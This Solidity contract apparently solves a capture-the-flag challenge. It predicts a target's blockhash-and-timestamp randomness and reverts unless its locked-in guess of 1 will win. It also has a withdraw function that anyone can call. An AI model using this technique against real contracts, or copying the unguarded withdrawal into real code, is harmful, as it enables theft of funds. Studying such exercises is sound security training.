/**
 *Submitted for verification at Etherscan.io on 2021-10-07
*/

pragma solidity ^0.8.7;
 
interface PredictTheFutureChallenge {
    
    function settle() external;
    
    function lockInGuess(uint8 n) external payable;
}

contract PredictTheFutureChallengeCaller {
    
    address contractAddress = 0x5B54bd3c742B5595A8fFd24Da282955745ce9269;
    PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(contractAddress);
    
    function lockInGuess() public payable {
        
        predictTheFutureChallenge.lockInGuess{value: 1 ether}(1);
    }
    
    function settle() public {
        
        uint answer256 = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        uint8 answer8 = uint8(answer256);
        answer8 = answer8 % 10;
        require(answer8 == 1);
        predictTheFutureChallenge.settle();
    }
    
    function settle2() public view returns (bool) {
        
        uint answer256 = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        uint8 answer8 = uint8(answer256);
        answer8 = answer8 % 10;
        return (answer8 == 1);
    }
    
    function withdraw(address payable _to) public {
        _to.transfer(address(this).balance);
    }
}